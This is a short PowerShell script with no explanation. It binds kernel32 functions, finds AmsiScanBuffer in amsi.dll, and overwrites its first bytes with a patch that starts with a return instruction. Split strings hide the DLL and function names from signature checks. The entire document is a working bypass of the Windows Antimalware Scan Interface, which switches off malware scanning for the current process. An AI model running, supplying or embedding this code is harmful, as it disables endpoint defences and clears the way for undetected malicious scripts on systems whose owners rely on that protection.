$pinvoke_obj = @"
using System;
using System.Runtime.InteropServices;

public class WinApi {
	
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
	
}
"@
Add-Type $pinvoke_obj
$amsiDll = [WinApi]::LoadLibrary("ams"+"i.dll")
$funcAddr = [WinApi]::GetProcAddress($amsiDll, "Ams"+"iScanB"+"uffer")
$patch = [Byte[]](0xc3,0x80,0x07,0x00,0x57,0xb8)
$out = 0
[WinApi]::VirtualProtect($funcAddr, [uint32]$patch.Length, 0x40, [ref] $out)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $funcAddr, $patch.Length)
[WinApi]::VirtualProtect($funcAddr, [uint32]$patch.Length, $out, [ref] $null)
